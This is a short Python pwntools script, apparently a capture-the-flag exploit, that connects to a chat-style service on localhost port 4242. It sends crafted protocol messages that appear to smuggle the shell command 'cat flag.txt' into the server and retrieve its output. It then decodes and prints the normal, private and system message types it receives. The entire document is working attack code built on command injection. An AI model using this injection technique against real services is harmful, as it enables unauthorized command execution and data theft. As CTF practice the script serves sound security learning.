from __future__ import print_function
from pwn import *

p = remote("localhost", 4242)

pause(2)
p.send("*H-mm-s cat flag.txt \x03")
p.send("*H-mm-S commandOutput\x03")

while (1):
    a = p.recvuntil("\x03")
    a = a.replace("\x00", "")

    if a[0] == "\x05":
        print("Normal Message (color " + str(int(a[1].encode("hex"))) + "): " + repr(a[2:-1]))
    elif a[0] == "\x06":
        print("Private Message (type " + str(int(a[1].encode("hex"))) + "): " + repr(a[2:-1]))
    elif a[0] == "\x07":
        print("System Message (", end="")
        if a[1] == "\x01":
            print("set your name): ", end="")
        elif a[1] == "\x02":
            print("add name to your list): ", end="")
        elif a[1] == "\x03":
            print("change name in your list): ", end="")
        elif a[1] == "\x04":
            print("remove user with name from list): ", end="")
        print(repr(a[2:-1]))

    else:
        print("Unknown: " + repr(a))

p.close()
